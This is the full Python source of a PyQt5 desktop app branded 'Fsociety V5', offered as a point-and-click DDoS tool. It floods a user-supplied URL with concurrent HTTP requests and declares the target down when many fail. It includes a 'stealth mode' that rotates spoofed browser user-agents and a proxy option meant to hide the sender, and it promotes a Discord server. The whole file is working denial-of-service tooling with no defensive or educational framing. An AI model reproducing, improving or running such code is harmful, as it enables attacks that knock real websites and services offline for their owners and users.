import sys
import requests
import threading
import time
import random
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QVBoxLayout, QWidget, QLabel,
    QLineEdit, QPushButton, QTextEdit, QCheckBox,
    QSpacerItem, QSizePolicy
)
from PyQt5.QtCore import Qt, QThread, pyqtSignal
from PyQt5.QtGui import QPixmap


class DDoSWorker(QThread):
    log_signal = pyqtSignal(str)
    finished_signal = pyqtSignal()

    def __init__(self, target_url, num_bots, stealth_mode=False, use_proxy=False):
        super().__init__()
        self.target_url = target_url
        self.num_bots = num_bots
        self.stealth_mode = stealth_mode
        self.use_proxy = use_proxy
        self.running = True
        
      
        self.proxies = [
            "192.168.1.1:8080",
            "10.0.0.1:3128",
            "172.16.0.1:8080",
            "192.168.0.1:8080",
            "10.1.1.1:3128",
            "172.20.0.1:8080",
            "192.168.2.1:3128",
            "10.0.1.1:8080",
            "172.16.1.1:3128",
            "192.168.1.2:8080"
        ]
        
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 10; SM-A505U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 10; SM-N975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36"
        ]

    def run(self):
        try:
            
            self.log_signal.emit(f"🔍 Vérification de l'URL : {self.target_url}")
            
            
            response = requests.get(self.target_url, timeout=5)
            self.log_signal.emit(f"✅ Connexion établie - Status: {response.status_code}")
            
            
            success_count = 0
            failure_count = 0
            
            
            threads = []
            lock = threading.Lock()
            
            def send_request():
                nonlocal success_count, failure_count
                try:
                    
                    headers = {}
                    if self.stealth_mode:
                        headers['User-Agent'] = random.choice(self.user_agents)
                    
                
                    proxies = None
                    if self.use_proxy:
                        proxies = {
                            'http': f'http://{random.choice(self.proxies)}',
                            'https': f'http://{random.choice(self.proxies)}'
                        }
                    
                  
                    response = requests.get(
                        self.target_url,
                        headers=headers,
                        proxies=proxies,
                        timeout=5
                    )
                    
                    with lock:
                        success_count += 1
                    
                    if self.stealth_mode:
                        self.log_signal.emit(f"✅ BOT (User-Agent: {headers.get('User-Agent', 'Default')})")
                    else:
                        self.log_signal.emit("✅ BOT ")
                        
                except Exception as e:
                    with lock:
                        failure_count += 1
                    self.log_signal.emit(f"❌ Requête échouée: {str(e)}")
            
          
            self.log_signal.emit(f"Démarrage de {self.num_bots} threads...")
            
            for i in range(self.num_bots):
                if not self.running:
                    break
                thread = threading.Thread(target=send_request)
                threads.append(thread)
                thread.start()
                
                
                if i % 10 == 0:
                    time.sleep(0.01)
            
          
            for thread in threads:
                thread.join()
                
           
            self.log_signal.emit(f" Attaque terminée")
            self.log_signal.emit(f" Résultats : {success_count} réussies, {failure_count} échouées")
            
            if failure_count > self.num_bots * 0.3:
                self.log_signal.emit("CIBLE DOWN !")
            else:
                self.log_signal.emit("CIBLE tjr active")
                
        except Exception as e:
            self.log_signal.emit(f"❌ Erreur critique : {str(e)}")
        
        self.finished_signal.emit()

    def stop(self):
        """Méthode pour arrêter l'attaque"""
        self.running = False


class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Fsociety V5 by akiro0devvv")
        self.setGeometry(200, 200, 600, 750)
        self.setStyleSheet("background-color: black; color: white;")

        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        layout = QVBoxLayout()

        layout.addSpacerItem(QSpacerItem(20, 40, QSizePolicy.Minimum, QSizePolicy.Expanding))

       
        self.log_output = QTextEdit()
        self.log_output.setReadOnly(True)
        self.log_output.setStyleSheet("background-color: black; color: white;")
        layout.addWidget(self.log_output)

       
        self.image_label = QLabel()
        self.image_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(self.image_label)

        layout.addSpacerItem(QSpacerItem(20, 30, QSizePolicy.Minimum, QSizePolicy.Expanding))

       
        layout.addWidget(QLabel("Target URL:"))
        self.url_input = QLineEdit()
        self.url_input.setText("http://example.com")
        layout.addWidget(self.url_input)

        layout.addWidget(QLabel("Number of Requests:"))
        self.requests_input = QLineEdit()
        self.requests_input.setText("100")
        layout.addWidget(self.requests_input)

       
        self.stealth_mode = QCheckBox("Enable Stealth Mode")
        layout.addWidget(self.stealth_mode)

        self.use_proxy = QCheckBox("Enable Proxy (Auto Fetch)")
        layout.addWidget(self.use_proxy)

       
        self.start_button = QPushButton("Start")
        self.start_button.setStyleSheet("background-color: red; color: white;")
        self.start_button.clicked.connect(self.start_attack)
        layout.addWidget(self.start_button)

        self.stop_button = QPushButton("Stop")
        self.stop_button.setStyleSheet("background-color: grey; color: white;")
        self.stop_button.clicked.connect(self.stop_attack)
        layout.addWidget(self.stop_button)

        layout.addSpacerItem(QSpacerItem(20, 40, QSizePolicy.Minimum, QSizePolicy.Expanding))
        central_widget.setLayout(layout)

        self.load_image("https://a.top4top.io/p_3347i1gqq1.jpeg")

    def load_image(self, url):
        try:
            r = requests.get(url, timeout=5)
            pixmap = QPixmap()
            pixmap.loadFromData(r.content)
            self.image_label.setPixmap(
                pixmap.scaled(300, 300, Qt.KeepAspectRatio, Qt.SmoothTransformation)
            )
            self.log("FSOCIETY ON TOP - dev by akiro00.dat - https://discord.gg/DcxzTDvnsW")
        except Exception as e:
            self.log(f"❌ Image error: {e}")

    def log(self, msg):
        self.log_output.append(msg)

    def start_attack(self):
        try:
            url = self.url_input.text().strip()
            num_requests = int(self.requests_input.text().strip())
            
            if not url:
                self.log("Veuillez entrer une URL valide")
                return
                
            self.start_button.setEnabled(False)
            self.log(f"DDoS Attack launched on {url} with {num_requests} requests...")
            
            self.ddos_worker = DDoSWorker(
                target_url=url,
                num_bots=num_requests,
                stealth_mode=self.stealth_mode.isChecked(),
                use_proxy=self.use_proxy.isChecked()
            )
            self.ddos_worker.log_signal.connect(self.log)
            self.ddos_worker.finished_signal.connect(self.attack_finished)
            self.ddos_worker.start()
            
        except ValueError:
            self.log("❌ Veuillez entrer un nombre valide pour le nombre de requêtes")
        except Exception as e:
            self.log(f"❌ Erreur au démarrage : {str(e)}")
            
    def stop_attack(self):
        if hasattr(self, 'ddos_worker') and self.ddos_worker.isRunning():
            self.log("Arrêt de l'attaque en cours...")
            self.ddos_worker.stop()
        else:
            self.log(" Aucune attaque en cours")
            
    def attack_finished(self):
        self.start_button.setEnabled(True)
        self.log("✅ Attaque terminée")


if __name__ == "__main__":
    import sys
    from PyQt5.QtWidgets import QApplication
    
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec_())
